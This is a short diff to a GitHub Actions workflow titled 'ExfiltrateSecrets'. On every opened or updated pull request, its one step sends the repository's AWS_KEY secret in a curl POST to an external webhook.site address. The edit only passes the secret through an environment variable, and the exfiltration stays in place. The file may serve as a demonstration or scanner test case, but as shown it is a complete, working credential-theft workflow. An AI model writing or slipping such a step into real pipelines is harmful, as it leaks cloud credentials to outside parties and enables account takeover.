@@ -1,4 +1,5 @@
 name: ExfiltrateSecrets
+
 on:
   pull_request:
     types: [opened, synchronize]
@@ -8,7 +9,9 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Curl Secret to External
+        env:
+          AWS_KEY: ${{ secrets.AWS_KEY }}
         run: |
           curl -X POST https://webhook.site/871b81d8-5c42-43ed-be4a-a400d364456b \
             -H "Content-Type: application/json" \
-            -d "{\"aws_key\": \"${{ secrets.AWS_KEY }}\"}"
+            -d "{\"aws_key\": \"${AWS_KEY}\"}"
